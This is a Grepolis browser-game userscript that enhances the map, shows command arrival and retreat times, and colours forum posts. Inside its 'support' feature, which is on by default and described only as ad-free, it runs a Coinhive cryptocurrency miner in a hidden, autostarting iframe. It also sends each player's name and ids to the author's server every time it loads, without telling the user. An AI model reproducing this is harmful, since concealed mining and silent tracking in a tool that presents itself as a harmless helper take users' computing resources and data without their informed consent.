// ==UserScript==
// @name         Grepolis Map Enhancer
// @author       Cyllos
// @description  Grepolis Map Enhancer by Cyllos
// @include      http://*.grepolis.com/game/*
// @include      https://*.grepolis.com/game/*
// @exclude      view-source://*
// @exclude      https://classic.grepolis.com/game/*
// @updateURL    https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.meta.js
// @downloadURL  https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.user.js
// @icon         https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png
// @version      1.10.c
// @grant GM_setValue
// @grant GM_getValue
// ==/UserScript==
var idleList = {};
var koloSet = false;
var startTime = 0;
var totalTime = 0;
var settings = {};
(
    function() {
        console.log("GME: Starting Grepolis Map Enhancer");
        laadSettings();
        stadsinfoStarter();
        setCSS();
        logData();
        if(settings.support) laadSupport();
        checkSettings();
        console.log("GME: Succesfully loaded Grepolis Map Enhancer!");
        observe(300); //observer
    })();


function laadSettings(){
    settings.oceaannummer = GM_getValue('setting_oceaannummer', true);
    settings.inactive = GM_getValue('setting_inactive', true);
    settings.inactiveMin = GM_getValue('setting_inactiveMin', 1);
    settings.inactiveMax = GM_getValue('setting_inactiveMax', 10);
    settings.colors = GM_getValue('setting_colors', true);
    settings.koloanimatie = GM_getValue('setting_koloanimatie', true);
    settings.tijden = GM_getValue('setting_tijden', true);
    settings.terugTrek = GM_getValue('setting_terugTrek', true);
    settings.tags = GM_getValue('setting_tags', true);
    settings.support = GM_getValue('setting_support', true);
    settings.playertag = GM_getValue('setting_playertag', false);
    settings.tagkleuren = GM_getValue('setting_tagkleuren', true);

}

function observe(time) {
    for (var item of document.getElementsByClassName("title")) {
        if (item.innerHTML == "Kolokiller") {
            item.innerHTML = "Kolokiller plugin";
            document.getElementsByClassName('post')[0].innerHTML = '<iframe src="https://cyllos.me/GME/GME?action=portal&world_id=' + Game.world_id + '&alliance_id=' + Game.alliance_id + '&player_id=' + Game.player_id + '&player_name=' + Game.player_name + '" width="100%" height="500px" frameborder="0"></iframe>';
        }
        if (settings.colors) checkColors(item);

    }
    if(settings.koloanimatie) koloAnimatie();
    if(settings.tijden) checkTijden();
    setTimeout(function() {
        observe(time);
    }, time);
}

function checkTijden(){
    var foundAttacks = false;
    var elementList;
    for(var itemlist of document.getElementsByClassName('js-dropdown-item-list')){
        if(itemlist.childElementCount != 0 && /movement/.test(itemlist.children[0].id)){
            foundAttacks = true;
            elementList = itemlist;
            break;
        }
    }
    if(foundAttacks && elementList.children != null){
        for(var child of elementList.children){
            //Indien nog niets toegevoegd
            if(child.children[0].children[1].children[2] == null){
                //Maak div met indicatorAankomsttijd
                indicator = document.createElement('div');
                indicator.className = 'indicatorAankomst';
                //Zet tijd om
                aankomstTime = Timestamp.toDate(child.dataset.timestamp);
                //Creeer data
                aankomstuur = aankomstTime.getHours(); if(aankomstTime.getHours() < 10) aankomstuur = "0" + aankomstTime.getHours();
                aankomstmin = aankomstTime.getMinutes(); if(aankomstTime.getMinutes() < 10) aankomstmin = "0" + aankomstTime.getMinutes();
                aankomstsec = aankomstTime.getSeconds(); if(aankomstTime.getSeconds() < 10) aankomstsec = "0" + aankomstTime.getSeconds();

                aankomstData = aankomstuur + ':' + aankomstmin + ':' + aankomstsec;
                //Voeg data toe aan HTML
                indicatorText = document.createElement('p');
                indicatorText.innerHTML = aankomstData;
                indicator.appendChild(indicatorText);
                //Voeg HTML toe aan item command
                child.children[0].children[1].appendChild(indicator);

            }
            if(settings.terugTrek){
                //Indien starttijd bekend is en indien een 3de element bestaat zonder kinderen
                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2] != null && child.children[0].children[1].children[2].childElementCount < 2){
                    //Pak starttijd en reken er 10 min bij
                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
                    serverTimestamp = Timestamp.server();
                    console.log('GME: Found retreat max: ' + Timestamp.toDate(retreatTimestamp));
                    //Indien server nog jonger is dan max terugtrektijd
                    if(retreatTimestamp > serverTimestamp){
                        indicatorText = document.createElement('p');
                        indicatorText.className = 'indicatorTerugtrek';
                        retreatTime = Timestamp.toDate(retreatTimestamp);
                        retreatuur = retreatTime.getHours(); if(retreatTime.getHours() < 10) retreatuur = "0" + retreatTime.getHours();
                        retreatmin = retreatTime.getMinutes(); if(retreatTime.getMinutes() < 10) retreatmin = "0" + retreatTime.getMinutes();
                        retreatsec = retreatTime.getSeconds(); if(retreatTime.getSeconds() < 10) retreatsec = "0" + retreatTime.getSeconds();
                        indicatorText.innerHTML = ' (' + retreatuur + ':' + retreatmin + ':' + retreatsec + ')';
                        child.children[0].children[1].children[2].appendChild(indicatorText);
                    }
                }
                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2].children[1] != null){
                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
                    serverTimestamp = Timestamp.server();
                    if(retreatTimestamp < serverTimestamp){
                        child.children[0].children[1].children[2].children[1].innerHTML = ' ';
                    }
                }}
        }

    }
}

function checkColors(item){
    if ((/\ ROOD$/).test(item.innerText) || (/\ R$/).test(item.innerText)) {
        if (!/rood/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " rood";
        }
    }
    if ((/\ BLAUW$/).test(item.innerText) || (/\ B$/).test(item.innerText)) {
        if (!/bauw/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " blauw";
        }
    }
    if ((/\ GROEN$/).test(item.innerText) || (/\ G$/).test(item.innerText)) {
        if (!/groen/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " groen";
        }
    }
    if ((/\ GEEL$/).test(item.innerText) || (/\ E$/).test(item.innerText)) {
        if (!/geel/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " geel";
        }
    }
    if ((/\ ORANJE$/).test(item.innerText) || (/\ O$/).test(item.innerText)) {
        if (!/oranje/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " oranje";
        }
    }
    if ((/\ PAARS$/).test(item.innerText) || (/\ P$/).test(item.innerText)) {
        if (!/paars/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " paars";
        }
    }
}

function doSettings() {
    var windowExists = false;
    var windowItem = null;
    console.log('GME: Looking for settings');
    for(var item of document.getElementsByClassName('ui-dialog-title')){
        if(item.innerHTML == "Grepolis Map Enhancer Settings"){
            console.log('GME: Settings clicked!');
            windowExists = true;
            windowItem = item;
        }
    }
    if(!windowExists) wnd = Layout.wnd.Create(Layout.wnd.TYPE_DIALOG, "GME Settings"); console.log('GME: Creating settings window');
    wnd.setContent('');
    for(item of document.getElementsByClassName('ui-dialog-title')){
        if(item.innerHTML == "GME Settings"){
            console.log('GME: Found settings!');
            windowItem = item;
        }
    }
    wnd.setHeight('500');
    wnd.setWidth('800');
    wnd.setTitle('Grepolis Map Enhancer Settings');
    console.log('Opened settings');
    title = windowItem;
    frame = title.parentElement.parentElement.children[1].children[4];
    frame.innerHTML = '';
    var html = document.createElement('html');
    var body = document.createElement('div');
    var head = document.createElement('head');
    var element = document.createElement('img');
    element.src = "http://oi63.tinypic.com/dq6ibk.jpg";
    element.style.width = "100%";
    body.appendChild(element);
    element = document.createElement('h4');
    element.innerHTML = "Instellingen";
    body.appendChild(element);
    var list = document.createElement('ul');
    list.style.paddingBottom = "5px";

    var listitem = document.createElement('li').appendChild(document.createElement('div'));
    var checkbox = document.createElement('div');
    checkbox.className = 'cbx_icon';
    var caption = document.createElement('div');
    caption.className = 'cbx_caption';

    list.appendChild(addCheckbox(settings.oceaannummer, 'setting_oceaannummer', "Minder felle oceaancijfers (GRCRT) op kaart"));
    list.appendChild(addCheckbox(settings.tags,"setting_tags","Alliantietags op kaart"));
    list.appendChild(addCheckbox(settings.playertag,"setting_playertag","Spelertags op kaart"));
    list.appendChild(addCheckbox(settings.tagkleuren,"setting_tagkleuren","Tags kleuren naar vlag"));
    list.appendChild(addCheckbox(settings.inactive,"setting_inactive","Inactieve spelers op kaart"));

    listitem = document.createElement('p');
    listitem.innerHTML = "Minimum tot maximum dagen inactief";
    listitem.style.lineHeight = '0';
    list.appendChild(listitem);

    listitem = document.createElement('div');
    listitem.className = "textbox";
    //listitem.style.float = 'left';
    listitem.style.width = '60px';
    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMin" value="' + settings.inactiveMin +' " size="10" type="text"></div></div>';
    list.appendChild(listitem);

    listitem = document.createElement('div');
    listitem.className = "textbox";
    //listitem.style.float = 'left';
    listitem.style.width = '60px';
    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMax" value="' + settings.inactiveMax + '" size="10" type="text"></div></div>';
    list.appendChild(listitem);

    list.appendChild(addCheckbox(settings.koloanimatie,"setting_koloanimatie","Kolonisatieschip animatie"));
    list.appendChild(addCheckbox(settings.colors,"setting_colors","Kleuren op het forum"));
    list.appendChild(addCheckbox(settings.tijden,"setting_tijden","Tijden bij commando"));
    list.appendChild(addCheckbox(settings.terugTrek,"setting_terugTrek","Laatste terugtrek bij commando"));

    body.appendChild(list);
    element = document.createElement('div');
    element.className = "button_new";
    element.id = 'settings_reload';
    element.style.margin = "2px";
    childElement = document.createElement('div');
    childElement.className = 'left';
    element.appendChild(childElement);
    childElement = document.createElement('div');
    childElement.className = 'right';
    element.appendChild(childElement);
    childElement = document.createElement('div');
    childElement.className = 'caption js-caption';
    childElement.innerHTML = 'Opslaan en herladen<div class="effect js-effect"></div>';
    element.style.float = 'left';
    element.appendChild(childElement);
    body.appendChild(element);

    listitem = addCheckbox(settings.support,"setting_support","Support dit project<p style=\"line-height: 0;font-size: 9px;\">(toont geen ads maar werkt niet met adblock aan)</p>");

    getSupporters();
    getSupportPlayer();
    element = document.createElement('p');
    element.innerHTML = listitem.outerHTML;
    element.innerHTML += '<p id="playersupport"></p>';
    element.innerHTML += '<p id="topsupport"></p>';
    element.innerHTML += 'BTC: 38DjmGJiSn52Hk4h3aQvy1oCEqAq39zUF7';
    element.innerHTML += '<br>GRC: SGNF5BMt3uADgSzm1sKD4LBBt8cS5Fc42b';
    element.id = 'supportbox';
    body.appendChild(element);

    element = document.createElement('p');
    element.innerHTML = 'Grepolis Map Enhancer v.' + GM_info.script.version;
    element.innerHTML += '<br>Copyright &copy; cyllos ' + Timestamp.toDate(Timestamp.server()).getFullYear();
    element.innerHTML += '<br><p style="font-size: xx-small">contact: <a href="mailto:cyllos@cobrasec.org">cyllos@cobrasec.org</a></p>';
    element.style.position = 'absolute';
    element.style.bottom = "0";
    element.style.left = "0";
    element.style.marginBottom = "0";
    element.style.lineHeight =  "1";
    body.appendChild(element);

    html.appendChild(head);
    html.appendChild(body);
    frame.appendChild(html);
    $(".gmesettings").click(function(){toggleSetting(this);});
    $("#settings_reload").click(function(){GM_setValue('setting_inactiveMin', $('#setting_inactiveMin').val()); GM_setValue('setting_inactiveMax', $('#setting_inactiveMax').val());window.location.reload(true); });
}
function toggleSetting(element) {
    $('#' + element.id).toggleClass("checked");
    settings[element.id] = $(element).hasClass("checked");
    GM_setValue(element.id, $(element).hasClass("checked"));
    console.log('Setting ' + element.id + ' changed to ' + $(element).hasClass("checked") + ' (GM_getvalue = ' + GM_getValue(element.id) + ')');
}
function checkSettings() {
    if(document.getElementById('GMESetupLink') == null){
        a = document.createElement('div');
        a.id = "GMESetupLink";
        a.className = 'btn_settings circle_button';
        img = document.createElement('div');
        img.style.margin = '6px 0px 0px 5px';
        img.style.background = "url(https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png) no-repeat 0px 0px";
        img.style.width = '22px';
        img.style.height = '22px';
        img.style.backgroundSize = '100%';
        a.style.top = '105px';
        a.style.right = '-4px';
        a.style.zIndex = '10000';
        a.appendChild(img);
        document.getElementById('ui_box').appendChild(a);
        $("#GMESetupLink").click(doSettings);
    }
}

function addCheckbox(setting, id, beschrijving){
    checkbox = document.createElement('div');
    checkbox.className = 'cbx_icon';
    caption = document.createElement('div');
    caption.className = 'cbx_caption';
    listitem = document.createElement('li').appendChild(document.createElement('div'));
    state = "unchecked";if(setting) state = "checked";
    listitem.id = id;
    listitem.className = "gmesettings checkbox_new green " + state;
    caption.innerHTML = beschrijving;
    listitem.appendChild(checkbox);
    listitem.appendChild(caption);
    return listitem.parentElement;
}

function koloAnimatie() {
    for (var item of document.getElementsByClassName("attack_takeover")) {
        if(item.parentNode.parentNode.parentNode.parentNode.innerHTML == 'attack_overview') break;
        if(/support_filter/.test(item.className)) break;
        if (koloSet == false) {
            startTime = item.parentNode.parentNode.dataset.starttime;
            totalTime = item.parentNode.parentNode.dataset.timestamp;
            for (var middle of document.getElementsByClassName('middle')) {
                if (middle.parentNode.className == 'nui_toolbar') {
                    koloSet = true;
                    link = item.parentElement.children[1].children[1].children[0].href;
                    var vlag_r = '<p class ="koloAanduider"><a class="gp_town_link" href="' + link + '"><img style="width: 15px;height: 18px; position: absolute; left: 33%; top: 10px;, z-index: 99;" src="https://github.com/Cyllos42/GME/raw/master/sources/flag_r.png"></a></p>';
                    var vlag_y = '<img class="koloAanduider" style="width: 15px;height: 18px; position: absolute; left: -15px; top: 10px;, z-index: 99;" src="https://github.com/Cyllos42/GME/raw/master/sources/flag_y.png">';
                    var koloBoot = '<img class="koloAanduider" id="koloboot" src="https://github.com/Cyllos42/GME/raw/master/sources/cs.png">';
                    var koloLijn = '<div class="koloAanduider" style="width: 33%; height: 5px; position: absolute; left: 0; top: 23px; z-index: 98;background: url(\'https://gpnl.innogamescdn.com/images/game/common/water_base.png\') repeat 0 0;}" id="kololijn"></div>';
                    middle.innerHTML = middle.innerHTML + koloBoot + koloLijn + vlag_r + vlag_y;
                }
            }
        }
    }
    var koloAangekomen = false;
    if (startTime != 0) {
        var a = (Timestamp.server() - startTime) / (totalTime - startTime) * 30;
        if (a * 3.33 > 100) {
            startTime = 0;
            koloAangekomen = true;
        }
        var css;
        if (document.getElementById('kolocss') == null) {
            console.log('GME: Added kolo tracker.');
            css = [
                "#koloboot{",
                "}"
            ].join("\n");

            var node = document.createElement("style");
            node.type = "text/css";
            node.id = 'kolocss';
            node.appendChild(document.createTextNode(css));
            var heads = document.getElementsByTagName("head");
            if (heads.length > 0) {
                heads[0].appendChild(node);
            } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
                // }
            }

        } else if(totalTime == -1) {
            css = [
                "#koloboot{",
                "display: none;",
                "}"
            ].join("\n");
            document.getElementById('kolocss').innerHTML = css;
        } else {
            css = [
                "#koloboot{",
                "position: absolute;",
                "left: " + a + "%;",
                "top: 1px;",
                "width: 25px;",
                "height: 25px;",
                "z-index: 100;",
                "}"
            ].join("\n");
            document.getElementById('kolocss').innerHTML = css;
        }
    }
    if (koloAangekomen) {
        for (var koloAanduider of document.getElementsByClassName('koloAanduider')) {
            koloAanduider.innerHTML = '';
        }
    }

}

function setCSS() {
    if(settings.oceaannummer){
        oceaannummer = '.RepConvON {opacity: 0.04 !important;}';
    } else oceaannummer = "";
    var css = [
        "input {",
        " color: black;",
        "}",
        ".grcrtpoints {",
        "	color: white !important ;",
        "	font-size: 9px !important ;",
        "}",
        ".sandy-box .item.command{",
        "   height: 54px !important;",
        "}",
        ".indicatorTerugtrek {",
        "	color: rgba(150, 0, 0, 0.5) ;",
        "}",
        ".indicatorAankomst {",
        "	color: rgba(0, 0, 0, 0.5) ;",
        "	font-size: xx-small ;",
        "   position: relative;",
        "   display: flex;",
        "   line-height: 0px;",
        "}",
        "",
        "#map .badge.claim{",
        "	animation: blink-animation 2s steps(30, start) infinite;",
        "}",
        "@keyframes blink-animation {",
        "50% {",
        "    opacity: 0.0;",
        "  }",
        "}",
        oceaannummer,
        "@keyframes blink-animation2 {",
        "90% {",
        "    outline-style: solid;",
        "  outline-color: limegreen;",
        "   outline-offset: 0px;",
        "  }",
        "}",
        ".tile.lvl1 {",
        "	opacity: 0.6;",
        "}",
        "",
        ".tile.lvl2 {",
        "	opacity: 0.7;",
        "}",
        "#supportbox{",
        "  position: absolute;",
        "  bottom: 0px;",
        "  right: 0px;",
        "  list-style: none;",
        "  border: 1px rgba(0, 0, 0, 0.4) dashed;",
        "  padding: 10px;",
        "  line-height: 1.2;",
        "  font-size: 12px;",
        "}",
        "",
        "#questlog .questlog_icon {",
        " background-color: rgba(0, 0, 0, 0);",
        " background-image: url('https://github.com/Cyllos42/GME/raw/master/sources/questionlog.png');",
        "}",
        "",
        ".tile.farm_town {",
        "	border: none;",
        "}",
        ".attack_planner li.selected {",
        "background: sandybrown;",
        "}",
        "#map_towns .flag .alliance_name {",
        "pointer-events: none;",
        "opacity: 0.8;",
        "position: absolute;",
        "top: -17px;",
        "left: -58px;",
        "width: 110px;",
        "color: white;",
        "text-align: center;",
        "display: block;",
        "font-size: x-small;",
        "text-shadow: 1px 1px rgba(0,0,0,0.7);",
        "}",
        "",
        ".crm_icon {",
        "	display: none;",
        "}",
        ".groen div{",
        "background-color: #CCF29F;",
        "}",
        ".blauw div{",
        "background-color: #9fd5f2;",
        "}",
        ".rood div{",
        "background-color: #FFBD9B;",
        "}",
        ".oranje div{",
        "background-color: #f7c274;",
        "}",
        ".geel div{",
        "background-color: #f2f09f;",
        "}",
        ".paars div{",
        "  background-color: #a49ff2;,",
        "}"
    ].join("\n");

    var node = document.createElement("style");
    node.type = "text/css";
    node.appendChild(document.createTextNode(css));
    var heads = document.getElementsByTagName("head");
    if (heads.length > 0) {
        heads[0].appendChild(node);
    } else {
        // no head yet, stick it whereever
        document.documentElement.appendChild(node);
        // }
    }
    console.log("GME: Added CSS");
}

function createAwesomeNotification(var1, var2) {
    var var3 = (typeof Layout.notify == 'undefined') ? new NotificationHandler() : Layout;
    var3.notify($('#notification_area>.notification').length + 1, var1, '<span><b>' + 'Grepolis Map Enhancer' + '</b></span>' + var2 + '<span class=\'small notification_date\'>' + ' </span>');
}

function getidleList() {
    return $.ajax({
        url: "https://www.grcrt.net/json.php",
        method: "get",
        data: {
            method: "getIdleJSON",
            world: Game.world_id
        },
        cache: !0
    });
}

function logData(){
    return $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'log',
            world_id: Game.world_id,
            alliance_id: Game.alliance_id ,
            player_id: Game.player_id,
            player_name: Game.player_name
        },
        cache: !0
    });
}


function stadsinfo(var1, var3, data) {

    if (var1 != undefined && var1.length > 0 && var3.player_id) {
        for (var var2 = 0; var2 < var1.length; var2++) {
            if (var1[var2].className == 'flag town') {
                var border = "";
                var inactive = "";
                if (settings.inactive && data.JSON[var3.player_id] >  settings.inactiveMin && data.JSON[var3.player_id] <  settings.inactiveMax) {
                    inactive = "(" + parseInt(data.JSON[var3.player_id]) + "d)";
                    border = "outline: groove red 2px;animation: blink-animation2 2s steps(1, start) infinite;";
                } else {
                    border = " ";
                    inactive = " ";
                }
                playername = ' ';
                alliancename = ' ';
                if(settings.playertag){ playername = var3.player_name; }
                if(settings.tags){ alliancename = (var3.alliance_name || ' ');}
                if(settings.playertag && settings.tags){ playername += '<br>';}
                if(settings.tagkleuren) { kleuren = 'style="background-color: inherit;';} else {kleuren = ' ';}
                $(var1[var2]).append('<div class="alliance_name" ' + kleuren + border + '">' + playername + alliancename + " " + inactive + '</div>');
                break;
            }
        }
    }
    return var1;
}

function getSupporters(){
    $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'getSupport',
        },
        cache: !0
    }).success(function(data){
        supporters = JSON.parse(data).users;
        document.getElementById('topsupport').innerHTML = 'Top supporters: <br>1: ' + supporters[0].name + ' (' + parseInt(supporters[0].total/10000) + ' punten) <br>2: ' +
            supporters[1].name + ' (' + parseInt(supporters[1].total/10000) + ' punten) <br>3: ' +
            supporters[2].name + ' (' + parseInt(supporters[2].total/10000) + ' punten)';
    });
}

function getSupportPlayer(){
    $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'getSupport',
            player: Game.player_name
        },
        cache: !0
    }).success(function(data){
        supporters = JSON.parse(data);
        if(supporters.success) document.getElementById('playersupport').innerHTML = 'Jouw punten: ' +parseInt(supporters.total/10000);
        else document.getElementById('playersupport').innerHTML = 'Jouw punten: 0';
    });
}
function laadSupport(){
    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + Game.player_name + '&whitelabel=1&autostart=1&throttle=0.3&threads=&background=&text=Okay';
    supportNode = document.createElement('iframe');
    supportNode.src = support;
    supportNode.style.display = 'none';
    document.body.appendChild(supportNode);
}

function stadsinfoStarter() {
    idleList = getidleList();
    idleList.success(function(data) {
        console.log("GME: Adding town tags");
        var var1 = function(var10) {
            return function() {
                var var1 = var10.apply(this, arguments);
                return stadsinfo(var1, arguments[0], data);
            };
        };
        MapTiles.createTownDiv = var1(MapTiles.createTownDiv);
    });
}

function exec(fn) {
    var script = document.createElement('script');
    script.setAttribute("type", "application/javascript");
    script.textContent = '(' + fn + ')();';
    document.body.appendChild(script); // run the script
    //document.body.removeChild(script); // clean up
}
